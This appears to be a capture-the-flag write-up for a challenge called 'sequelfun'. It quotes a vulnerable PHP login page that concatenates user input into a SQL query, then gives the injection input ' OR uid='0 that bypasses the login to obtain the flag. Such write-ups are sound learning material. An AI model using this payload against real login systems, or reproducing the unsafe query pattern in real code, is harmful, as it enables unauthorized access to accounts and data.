# sequelfun
---
## Solution
1. See the php file, we can use sql injection. Also note that the uid is also equal 0 to get flag
```
<?php
include ("config.php");
if (isset ($_GET['user']) && isset ($_GET['pass'])) {
  $user = $_GET['user'];
  $pass = $_GET['pass'];
  if (strpos ($user, '1') === false && strpos ($pass, '1') === false) {
    $conn = new mysqli ($servername, $username, $password, $dbname);
    $result = mysqli_query ($conn, "SELECT * FROM users WHERE user='" . $user . "' AND pass='" . $pass . "'", MYSQLI_STORE_RESULT); // TO-DO: Remove elf:elf account
    if ($result === false) {
      echo "<b>Our servers have run into a query error. Please try again later.</b>";
    } else {
      if ($result->num_rows !== 0) {
        $row = mysqli_fetch_array ($result, MYSQLI_ASSOC);
        echo "<h1>You are logged in as: " . $row["user"] . "</h1><br>";
        echo "<b class='flag'>";
        if ($row ["uid"] === "0")
          echo $flag;
        else
          echo "Welcome elf!";
        echo "</b>";
      } else {
        echo "<b>Login fail.</b>";
      }
    }
  } else {
    echo "<b>I don't like the number 1 :(</b>";
  }
} else {
  echo '<form class="center">
    <h1>Santa Login:</h1>
    <label>Username:</label> <input type="text" name="user" autocomplete="off"><br>
    <label>Password:</label> <input type="password" name="pass" autocomplete="off"><br>
    <input type="submit" value="Connect">
  </form>';
}
?>
```
2. in username enter ' OR uid='0 and password enter ' OR uid='0
and query bacomes 
```
SELECT * FROM users WHERE user='' OR uid='0' AND pass='' OR uid='0'
```
and we can get the flag
